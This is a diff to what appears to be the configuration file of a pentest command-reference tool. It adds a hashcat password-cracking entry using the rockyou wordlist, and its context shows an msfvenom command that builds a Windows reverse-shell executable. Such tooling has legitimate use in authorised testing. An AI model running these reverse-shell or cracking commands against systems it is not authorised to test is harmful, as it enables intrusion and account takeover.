@@ -117,7 +117,17 @@ args = "-p <payload|windows/shell_reverse_tcp> LHOST=<ip|127.0.0.1> LPORT=<port|
 examples = [
     "msfvenom -p payload|windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f exe > reverse_tcp.exe"
 ]
-
+[command.hashcat0]
+name_exe = "hashcat"
+cmd_types = "pentest"
+explanation = """
+Crack password of a chosen <type>.
+This can be combined with hashid to find type of hash:
+$ hashid <hash>"""
+args = "-m <type> <hashfile|hash.txt> <wordlist|/usr/share/wordlists/rockyou.txt>"
+examples = [
+    "hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt"
+]
 
 # ===== REVERSE COMMANDS =====
 [command.objdump0]
